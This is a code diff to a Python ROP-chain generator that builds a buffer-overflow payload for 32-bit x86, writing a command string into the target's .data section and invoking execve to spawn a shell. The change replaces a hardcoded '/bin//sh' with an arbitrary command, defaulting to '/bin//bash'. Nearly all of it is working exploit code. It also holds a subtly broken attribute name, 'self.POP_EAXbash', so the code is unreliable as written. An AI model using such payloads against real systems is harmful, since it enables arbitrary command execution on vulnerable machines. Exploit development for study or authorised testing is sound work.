@@ -1,4 +1,5 @@
 import re
+import math
 from struct import pack
 
 class ParseChain():
@@ -48,11 +49,24 @@ class ParseChain():
     def parse_data_loc(self, data_loc):
         self.DATA = int(data_loc, 16)
         
-    def make_chain(self):
+    def make_chain(self, cmd=''):
         p = b'A'*40
         p += b'B'*4
 
-        p += self.POP_EDX
+        cmd_bound = math.ceil(len(cmd) / 4)
+
+        for i in range(0, cmd_bound):
+            p += self.POP_EDX
+            p += pack('<I', self.DATA + i*4)
+            p += self.POP_EAXbash
+            if i*4+4 <= len(cmd):
+                p += str.encode(cmd[i*4:i*4+4])
+            else:
+                p += str.encode(cmd[i*4:len(cmd)])
+                p += b'A' * (cmd_bound*4 - len(cmd))
+            p += self.MOVSTACK
+        
+        '''p += self.POP_EDX
         p += pack('<I', self.DATA)
         p += self.POP_EAX
         p += b'/bin'
@@ -62,20 +76,25 @@ class ParseChain():
         p += pack('<I', self.DATA + 4)
         p += self.POP_EAX
         p += b'//sh'
+        p += self.MOVSTACK'''
+
+        p += self.POP_EDX
+        p += pack('<I', self.DATA + len(cmd))
+        p += self.XOR_EAX
         p += self.MOVSTACK
 
         p += self.POP_EDX
-        p += pack('<I', self.DATA + 8)
+        p += pack('<I', self.DATA + cmd_bound * 4)
         p += self.XOR_EAX
         p += self.MOVSTACK
 
         p += self.POP_EBX
         p += pack('<I', self.DATA)
         p += self.POP_ECX_EBX
-        p += pack('<I', self.DATA + 8)
+        p += pack('<I', self.DATA + cmd_bound * 4)
         p += pack('<I', self.DATA)
         p += self.POP_EDX
-        p += pack('<I', self.DATA + 8)
+        p += pack('<I', self.DATA + cmd_bound * 4)
 
         p += self.XOR_EAX
         for _ in range(0, 11): p += self.INC_EAX
@@ -98,7 +117,7 @@ class ParseChain():
             regex = re.search("# @ .data\n", line)
             if regex: self.parse_data_loc(line.split(",")[1][1:11])
         
-        chain = self.make_chain()
+        chain = self.make_chain('/bin//bash')
         self.write_chain(chain)
 
 pc = ParseChain()
